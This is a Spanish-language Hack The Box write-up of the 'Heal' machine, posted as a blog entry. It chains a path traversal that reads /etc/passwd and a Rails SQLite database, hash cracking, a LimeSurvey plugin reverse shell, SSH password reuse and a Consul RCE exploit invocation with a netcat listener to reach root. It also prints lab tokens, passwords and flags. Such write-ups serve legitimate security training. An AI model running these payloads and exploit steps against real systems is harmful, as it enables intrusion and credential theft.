@@ -1,0 +1,422 @@
+---
+layout: post
+
+title: "Writeup Heal"
+excerpt: 'La máquina Heal de Hack The Box es una máquina de dificultad intermedia que presenta una combinación de vulnerabilidades web y de configuración.'
+
+category: writeups
+category_label: "Writeups"
+primary_category_anchor: writeups
+categories:
+  - writeups
+kicker: "Writeups"
+kicker_secondary: "VulnHub"
+tags:
+- 'VulnHub'
+
+post_title: "Writeup Heal"
+description: "La máquina Heal de Hack The Box es una máquina de dificultad intermedia que presenta una combinación de vulnerabilidades web y de configuración."
+
+slug: writeup-heal-htb
+permalink: /blog/writeups/writeup-heal-htb.html
+
+nav: blog
+
+featured: false
+featured_badge: ""
+featured_lines:
+  - "Fuzzing"
+  - "Path Traversal"
+  - "Burp Suite"
+
+cover_badge: "Hack The Box"
+cover_lines:
+  - "Fuzzing"
+  - "Path Traversal"
+  - "Burp Suite"
+
+cover_image: /assets/img/blog/heal/featured_image_heal.jpg
+
+reading_time: "8 min de lectura"
+date: 2025-12-29 10:00:00 +0100
+
+toc_html: |
+  <a href="#1-escaneo-inicial">1. Escaneo Inicial</a>
+  <a href="#2-enumeracion-web">2. Enumeración Web</a>
+  <a href="#3-interaccion-con-la-api-y-path-traversal">3. Interacción con la API y Path Traversal</a>
+  <a href="#4-explotacion-de-la-base-de-datos">4. Explotación de la Base de Datos</a>
+  <a href="#41-busqueda-de-archivos-de-configuracion-del-servidor">4.1 Busqueda de archivos de configuracion del servidor</a>
+  <a href="#411-busqueda-del-archivo-databaseyml">4.1.1 Busqueda del archivo database.yml</a>
+  <a href="#412-fuerza-bruta-con-jtr-para-obtener-credenciales-de-usuario">4.1.2 Fuerza bruta con JtR para obtener credenciales de usuario.</a>
+  <a href="#413-explotacion-de-limesurvey">4.1.3 Explotacion de LimeSurvey</a>
+  <a href="#5-escalada-de-privilegios">5. Escalada de Privilegios</a>
+  <a href="#51-post-explotacion-y-acceso-root">5.1 Post-Explotación y Acceso Root</a>
+
+---
+
+<p>La máquina <strong>Heal</strong> de <strong>Hack The Box</strong> es una máquina de dificultad intermedia que presenta una combinación de vulnerabilidades web y de configuración.</p>
+<!--more-->
+<p>A lo largo de este write-up, detallaré los pasos que seguí para comprometer la máquina, desde la enumeración inicial hasta la escalada de privilegios para obtener acceso root.</p>
+<p>Esta máquina es ideal para practicar ataques de Path Traversal, explotación de APIs, manipulación de bases de datos y la explotación de servicios internos expuestos.</p>
+<p><img alt="alt text" src="/assets/img/blog/heal/Heal.png"/></p>
+<h2 id="1-escaneo-inicial">1. Escaneo Inicial</h2>
+<p>Comencé con un escaneo básico para identificar los puertos abiertos en la máquina ojetivo.</p>
+<pre><code class="language-sh">export IP=10.10.11.46 
+nmap -Pn $IP    
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/heal/image.png"/></p>
+<pre><code class="language-sh">sudo nmap -p22,80 -sS -sV -sC $IP -O -oA scan_nmap_Heal
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-1.png"/></p>
+<pre><code class="language-sh">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+</code></pre>
+<p><strong>Resultados del escaneo:</strong></p>
+<ul>
+<li><strong>22/tcp</strong> abierto → OpenSSH 8.9p1 Ubuntu 3ubuntu0.10</li>
+<li><strong>80/tcp</strong> abierto → nginx 1.18.0 (Ubuntu)</li>
+</ul>
+<h2 id="2-enumeracion-web">2. Enumeración Web</h2>
+<p>En la enumeración obtuve los resultados:</p>
+<ul>
+<li>http-server-header: nginx/1.18.0 (Ubuntu)</li>
+<li>http-title: Did not follow redirect to http://heal.htb/
+Añadí este dominio a mi archivo <code>/etc/hosts</code>:</li>
+</ul>
+<pre><code class="language-sh">echo "10.10.11.46 heal.htb" | sudo tee -a /etc/hosts &gt; /dev/null
+cat /etc/hosts
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-2.png"/></p>
+<p>Comprobe visualmente la web</p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-3.png"/></p>
+<p>A continuacion realicé un escaneo con nuclei de la maquina objetivo.</p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-4.png"/></p>
+<pre><code class="language-sh">                     __     _
+   ____  __  _______/ /__  (_)
+  / __ \/ / / / ___/ / _ \/ /
+ / / / / /_/ / /__/ /  __/ /
+/_/ /_/\__,_/\___/_/\___/_/   v3.3.5
+
+                projectdiscovery.io
+
+[WRN] Found 4 templates with runtime error (use -validate flag for further examination)
+[INF] Current nuclei version: v3.3.5 (outdated)
+[INF] Current nuclei-templates version: v10.1.2 (latest)
+[WRN] Scan results upload to cloud is disabled.
+[INF] New templates added in latest release: 52
+[INF] Templates loaded for current scan: 8971
+[INF] Executing 8773 signed templates from projectdiscovery/nuclei-templates
+[WRN] Loading 198 unsigned templates for scan. Use with caution.
+[INF] Targets loaded for current scan: 1
+[INF] Templates clustered: 1698 (Reduced 1598 Requests)
+[INF] Using Interactsh Server: oast.site
+[waf-detect:nginxgeneric] [http] [info] http://10.10.11.46:80
+[ssh-server-enumeration] [javascript] [info] 10.10.11.46:22 ["SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10"]                                                            
+[ssh-sha1-hmac-algo] [javascript] [info] 10.10.11.46:22
+[ssh-password-auth] [javascript] [info] 10.10.11.46:22
+[openssh-detect] [tcp] [info] 10.10.11.46:22 ["SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10"]                                                                           
+[tech-detect:nginx] [http] [info] http://10.10.11.46:80
+</code></pre>
+<h3>2.1 Escaneo de Directorios y Subdominios</h3>
+<p>Utilicé <strong>gobuster</strong> para buscar directorios comunes:</p>
+<pre><code class="language-sh">gobuster dir -u http://heal.htb -w /usr/share/dirb/wordlists/common.txt
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-5.png"/></p>
+<p>Comprobé el fichero robots descubierto por si tuviera informacion sobre directorios o ficheros.</p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-6.png"/></p>
+<p>Luego, usé <strong>ffuf</strong> para descubrir subdominios:</p>
+<pre><code class="language-sh">ffuf -u http://heal.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -H 'Host: FUZZ.heal.htb' -fs 178 2&gt;/dev/null
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-7.png"/></p>
+<p>Descubrí el subdominio <strong>api.heal.htb</strong> y lo agregué a <code>/etc/hosts</code>:</p>
+<pre><code class="language-sh">sudo sed -i '$d' /etc/hosts 
+echo "10.10.11.46 heal.htb api.heal.htb" | sudo tee -a /etc/hosts &gt; /dev/null
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-8.png"/></p>
+<p>Comprobé que el subdominio nos da informacion sobre la api.</p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-9.png"/></p>
+<p>Comprobé si una vez añadido el subdominio de api ya podía crear cuenta con unas credenciales ficticias.</p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-10.png"/></p>
+<p>Obtengo acceso a la aplicacion que esta alojada que parece ser un constructor de curriculums opensource.</p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-11.png"/>
+<img alt="alt text" src="/assets/img/blog/heal/image-12.png"/>
+<img alt="alt text" src="/assets/img/blog/heal/image-13.png"/></p>
+<p>El boton take survey me condujo a http://take-survey.heal.htb/index.php/552933?lang=en que esta en un subdominio nuevo pero que al no estar en mi lista de hosts no lo resuelve, por lo que lo agregé</p>
+<pre><code class="language-sh">sudo sed -i '$d' /etc/hosts 
+echo "10.10.11.46 heal.htb api.heal.htb take-survey.heal.htb" | sudo tee -a /etc/hosts &gt; /dev/null
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-14.png"/></p>
+<p>Y al recargar la pagina obtuve acceso al formulario</p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-15.png"/></p>
+<p>Comprobé con gobuster este nuevo subdominio</p>
+<pre><code class="language-sh">gobuster dir -u http://take-survey.heal.htb -w /usr/share/dirb/wordlists/common.txt
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-16.png"/></p>
+<p>Obtuve los siguientes resultados de los cuales son reseñables:</p>
+<ul>
+<li><strong>200 OK</strong> /index.php</li>
+</ul>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-17.png"/></p>
+<p>Conseguí el correo del Administrador del sistema: <code>ralph@heal.htb</code></p>
+<ul>
+<li><strong>302 Found</strong> /Admin [--&gt; http://take-survey.heal.htb/index.php/admin/authentication/sa/login]</li>
+</ul>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-19.png"/></p>
+<ul>
+<li><strong>401 Unauthorized</strong> /uploader</li>
+</ul>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-18.png"/></p>
+<h3>2.2 Comprobacion de Superficie de ataque web</h3>
+<ul>
+<li><strong>Login en la aplicacion</strong></li>
+</ul>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-20.png"/></p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-21.png"/></p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-22.png"/></p>
+<p>Conseguí un token de autorizacion de la api.</p>
+<pre><code class="language-sh">Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo1fQ.7HQbv7vTQa-UIbcu3TPdEgxs3zZG0tYpT-yOC5uxMbM
+</code></pre>
+<ul>
+<li><strong>Boton de Exportacion PDF</strong></li>
+</ul>
+<p>Este boton hace una llamada a http://api.heal.htb/download?filename= y un valor que es el nombre del fichero a obtener.</p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-23.png"/></p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-24.png"/></p>
+<h2 id="3-interaccion-con-la-api-y-path-traversal">3. Interacción con la API y Path Traversal</h2>
+<p>Al interactuar con la API, descubrí que era posible descargar archivos a través del endpoint:</p>
+<pre><code class="language-http">http://api.heal.htb/download?filename=
+</code></pre>
+<h3>3.1 Prueba de Path Traversal</h3>
+<p>Intenté un ataque de <strong>Path Traversal</strong></p>
+<p>El Path Traversal es una vulnerabilidad que permite a un atacante acceder a archivos y directorios fuera del directorio raíz de la aplicación web. Esto se logra manipulando las rutas de archivo en las entradas de usuario, como en la URL que descubrí en el boton "<strong>Export as PDF</strong>"</p>
+<p>Si intento volver a bajar un archivo directamente desde la barra de direcciones usando la URL: <code>api.heal.htb/download?filename=ca03ad068f109171bb03.pdf </code></p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-25.png"/></p>
+<p>Obtengo un error de token invalido.</p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-26.png"/></p>
+<p>Usé BurpSuite para modificar la peticion añadiendo la autorizacion de api que obtuve en el login.</p>
+<p>Lancé la petición a http://api.heal.htb/download?filename= y la pasé a Repeater</p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-27.png"/></p>
+<p>Obtuve como respuesta el error de token invalido.</p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-28.png"/></p>
+<p>Llegado a este punto modifique la peticion añadiendole la el token de autorizacion que obtuve anteriormente</p>
+<pre><code class="language-sh">Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo1fQ.7HQbv7vTQa-UIbcu3TPdEgxs3zZG0tYpT-yOC5uxMbM
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-29.png"/></p>
+<p>Obtuve que el fichero no ha sido encontrado, ya que no le di valor de fichero. Pero me ha servido para comprobar que el servidor acepta mis peticiones de archivo con el token de autorizacion robado.</p>
+<p>El siguiente paso que realicé fue comprobar si podia acceder a archivos fuera de la carpeta contenedora de la aplicacion web como por ejemplo el archivo <code>passwd</code></p>
+<p>Comencé por http://api.heal.htb/download?filename=../../etc/passwd y fui añadiendo subdirectorios hacia arriba.</p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-30.png"/></p>
+<p>Con la peticion de http://api.heal.htb/download?filename=../../../../../etc/passwd obtuve acceso a el fichero passwd por lo que el ataque ha tuvo exito.</p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-31.png"/></p>
+<pre><code class="language-textplain">root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+pollinate:x:105:1::/var/cache/pollinate:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+syslog:x:107:113::/home/syslog:/usr/sbin/nologin
+uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
+tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
+landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
+fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+ralph:x:1000:1000:ralph:/home/ralph:/bin/bash
+lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
+avahi:x:114:120:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
+geoclue:x:115:121::/var/lib/geoclue:/usr/sbin/nologin
+postgres:x:116:123:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+_laurel:x:998:998::/var/log/laurel:/bin/false
+ron:x:1001:1001:,,,:/home/ron:/bin/bash
+</code></pre>
+<p>De este fichero obtengo que existen usuarios con capacidad de hacer login:</p>
+<ul>
+<li>root:x:0:0:root:/root:/bin/bash</li>
+<li>ralph:x:1000:1000:ralph:/home/ralph:/bin/bash</li>
+<li>postgres:x:116:123:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash</li>
+<li>ron:x:1001:1001:,,,:/home/ron:/bin/bash</li>
+</ul>
+<p>La x en la linea del usuario indica que la contraseña está en /etc/shadow, intento acceder a este fichero pero esta protegido y no es legible con mis permisos actuales.</p>
+<h2 id="4-explotacion-de-la-base-de-datos">4. Explotación de la Base de Datos</h2>
+<h2 id="41-busqueda-de-archivos-de-configuracion-del-servidor">4.1 Busqueda de archivos de configuracion del servidor</h2>
+<p>El servidor esta corriendo en ruby on rails.</p>
+<p>Realicée una busqueda en Google sobre los archivos de configuracion mas importantes de ruby on rails y encontré lo siguiente:</p>
+<ul>
+<li><strong>config/database.yml</strong>: contiene todas las configuraciones requeridas por Registro Activo para conectarse a una base de datos.</li>
+<li><strong>config/secrets.yml</strong>: almacena los datos confidenciales de su aplicación, como las claves de acceso y las contraseñas que se requieren para las API externas.</li>
+<li><strong>config/routes.rb</strong>: proporciona un mapeo entre a URL y una acción de controlador. Esto se cubre con más detalle en Enrutamiento de Rails.</li>
+</ul>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-32.png"/></p>
+<p>Comencé la busqueda de estos ficheros para intentar localizar claves hardcodeadas en los ficheros de configuracion.</p>
+<h2 id="411-busqueda-del-archivo-databaseyml">4.1.1 Busqueda del archivo database.yml</h2>
+<p>Despues de varias pruebas consigo llegar al fichero database.yml en la ruta ../../config/database.yml</p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-33.png"/></p>
+<pre><code class="language-textplain"># SQLite. Versions 3.8.0 and up are supported.
+#   gem install sqlite3
+#
+#   Ensure the SQLite 3 gem is defined in your Gemfile
+#   gem "sqlite3"
+#
+default: &amp;default
+  adapter: sqlite3
+  pool: &lt;%= ENV.fetch("RAILS_MAX_THREADS") { 5 } %&gt;
+  timeout: 5000
+
+development:
+  &lt;&lt;: *default
+  database: storage/development.sqlite3
+
+# Warning: The database defined as "test" will be erased and
+# re-generated from your development database when you run "rake".
+# Do not set this db to the same as development or production.
+test:
+  &lt;&lt;: *default
+  database: storage/test.sqlite3
+
+production:
+  &lt;&lt;: *default
+  database: storage/development.sqlite3
+</code></pre>
+<p>Obtuve que la base de datos se llama <code>development.sqlite3</code> y esta almacenado en la carpeta <code>storage</code>.</p>
+<p>Compruebo si tengo acceso con la ruta <code>../../storage/development.sqlite3</code></p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-34.png"/></p>
+<p>Descargué el fichero a mi maquina atacante y comprobé el contenido abriendo la base de datos en sqlite3 y comprobando las tablas que contiene.</p>
+<pre><code class="language-sh">sqlite3 /home/kali/Downloads/development.sqlite3 
+.tables
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-35.png"/></p>
+<p>Encontré una tabla de usuarios llamada <code>users</code> y comprobé el contenido.</p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-36.png"/></p>
+<pre><code class="language-sh">sqlite&gt; .mode column
+sqlite&gt; .headers on
+sqlite&gt; select * from users;
+id  email                password_digest                                               created_at                  updated_at                  fullname       username   is_admin
+--  -------------------  ------------------------------------------------------------  --------------------------  --------------------------  -------------  ---------  --------
+1   ralph@heal.htb       $2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG  2024-09-27 07:49:31.614858  2024-09-27 07:49:31.614858  Administrator  ralph      1       
+2   ibl4zquez@email.com  $2a$12$9JqZO5k2ELsnq8ULtTn1uuUyCvENX0xxVNGpa7WySVsnfyqxeIFHe  2025-02-08 20:18:52.433370  2025-02-08 20:18:52.433370  ibl4zqu3z      ibl4zqu3z  0       
+sqlite&gt; select username,password_digest from users;
+username   password_digest                                             
+---------  ------------------------------------------------------------
+ralph      $2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG
+ibl4zqu3z  $2a$12$9JqZO5k2ELsnq8ULtTn1uuUyCvENX0xxVNGpa7WySVsnfyqxeIFHe
+
+</code></pre>
+<p>Obtuve el hash de la clave del usuario ralph y lo guardé en un fichero para poder trabajar con el.</p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-37.png"/></p>
+<h2 id="412-fuerza-bruta-con-jtr-para-obtener-credenciales-de-usuario">4.1.2 Fuerza bruta con JtR para obtener credenciales de usuario.</h2>
+<p>Resolví el hash con <strong>JohnTheRipper</strong> y obtuve la clave para el usuario ralph.</p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-38.png"/></p>
+<p>Con el las credenciales que he obtenido hice login en el panel de administracion de <strong>take-survey.heal.htb</strong></p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-39.png"/></p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-40.png"/></p>
+<p>Comprobé que la version de LimeSurvey que esta corriendo es la 6.6.4</p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-41.png"/></p>
+<h2 id="413-explotacion-de-limesurvey">4.1.3 Explotacion de LimeSurvey</h2>
+<p>Busque vulnerabilidades conocidas para este entorno en searchsploit sin obtener resultados utiles.</p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-42.png"/></p>
+<p>Busque en Google y obtuve un repositorio en Github que contiene una prueba de concepto de RCE para LimeSurvey 6.6.4</p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-43.png"/></p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-44.png"/></p>
+<p>Cloné el repositorio a mi maquina para poder trabajar con el</p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-45.png"/></p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-46.png"/></p>
+<p>Configuré el fichero revshell.php con la IP de mi maquina.</p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-47.png"/></p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-48.png"/></p>
+<p>Comprimí los ficheros <code>config.xml</code> y <code>revshell.php</code> en un fichero zip llamado <code>N4s1rl1.zip</code> con el comando</p>
+<pre><code class="language-sh">zip -r N4s1rl1.zip config.xml revshell.php
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-49.png"/></p>
+<p>El siguiente paso fue navegar al apartado plugins y subir e instalar el fichero zip anterior.</p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-50.png"/></p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-51.png"/></p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-52.png"/></p>
+<p>Una vez subido lo activé.</p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-53.png"/></p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-54.png"/></p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-55.png"/></p>
+<p>Levanté un listener con netcat en mi maquina atacante a la escucha en el puerto 1234</p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-56.png"/></p>
+<p>Y a continuacion navegué a http://take-survey.heal.htb/upload/plugins/N4s1rl1/revshell.php para que se cargase el codigo de shell inversa que conectaria con mi maquina en el puerto 1234.</p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-57.png"/></p>
+<p>En la terminal del listener conseguí una shell a la maquina objetivo.</p>
+<h2 id="5-escalada-de-privilegios">5. Escalada de Privilegios</h2>
+<p>Navegué hasta la ruta de configuracion de la aplicacion limesurvey en busqueda de archivos de configuracion que tuvieran credenciales hardcodeadas.</p>
+<pre><code class="language-sh">cd var
+cd www
+cd limesurvey
+cd application
+cd config
+</code></pre>
+<p>En el directorio encontré el fichero <code>config.php</code> que contenia la clave del usuario para la base de datos survey.</p>
+<pre><code class="language-sh">cat config.php
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-58.png"/></p>
+<p>Comprobé si esta clave (<code>AdmiDi0_pA$$w0rd</code>) me daba acceso por ssh para alguno de los usuarios localizados en el sistema: ron o ralph.</p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-59.png"/></p>
+<p>Comprobé que podia obtener acceso con el usuario ron por ssh a la maquina objetivo con esas credenciales.</p>
+<p>Una vez logado como ron comprobé archivos y encontré la <strong>flag de user</strong></p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-60.png"/></p>
+<pre><code class="language-sh">4a974a9f66b7afae9fd7ec53aec84eca
+</code></pre>
+<h2 id="51-post-explotacion-y-acceso-root">5.1 Post-Explotación y Acceso Root</h2>
+<p>Enumeré los puertos internos abiertos en la maquina objetivo.</p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-61.png"/></p>
+<p>Encontré varios puertos abiertos ademas de los localizados anteriormente como son el 8500,8503,8600, etc.</p>
+<p>Creé una conexión SSH a la maquina con el usuario ron y un túnel SSH para redirigir el tráfico local. Aunque el puerto 8500 del servidor no esté abierto al mundo, con esto se podría acceder a él a través del túnel.</p>
+<p>El comando para ello es:</p>
+<pre><code class="language-sh">ssh -L 8500:127.0.0.1:8500 ron@heal.htb
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-62.png"/></p>
+<p>Una vez tunelizada la conexion intenté acceder via web al puerto a través de http://localhost:8500 y me hizo una redirección a http://localhost:8500/ui/server1/services</p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-63.png"/></p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-64.png"/></p>
+<p>Tras ese puerto se esta ejecutando Consul que es una herramienta desarrollada por HashiCorp para la gestión de servicios y redes en infraestructuras distribuida.</p>
+<p>La interfaz web de Consul a menudo corre en http://localhost:8500, como esta pasando en esta maquina. Si está expuesta sin autenticación, puede permitir que un atacante vea información crítica sobre los servicios y la infraestructura. En entornos comprometidos, los atacantes pueden usar túneles SSH (como el que he usado) para acceder a Consul y explorar la infraestructura interna.</p>
+<p>Consul en esta maquina corre la version 1.19.2</p>
+<p>Comprobé con searchsploit si existia alguna referencia de un exploit conocido para esta version.</p>
+<pre><code class="language-sh">searchsploit Consul
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-65.png"/></p>
+<p>Hice una copia del exploit RCE para la version 1 de Consul.</p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-66.png"/></p>
+<p>Convertí el exploit de formato txt a un formato de script de python con el comando:</p>
+<pre><code class="language-sh">mv 51117.txt exploit.py
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-67.png"/></p>
+<p>Levanté un listener con netcat en mi maquina atacante con el comando</p>
+<pre><code class="language-sh">nc -nvlp 4444
+</code></pre>
+<p>Ejecuté el exploit con el comando</p>
+<pre><code class="language-sh">python3 exploit.py localhost 8500 10.10.16.63 4444 0
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-68.png"/></p>
+<p>Y en la ventana del listener obtuve una shell con usuario root en la maquina objetivo.</p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-69.png"/></p>
+<p>Accedí a la carpeta root y obtuve la <strong>flag de root</strong></p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-70.png"/></p>
+<pre><code class="language-sh">dcd7a4115a1125300a64eae6ab145ffe
+</code></pre>
+<p>¡Máquina <strong>Heal</strong> completada exitosamente! 🎉</p>
+<p><img alt="alt text" src="/assets/img/blog/heal/image-71.png"/></p>
+<p>https://www.hackthebox.com/achievement/machine/1608403/640</p>
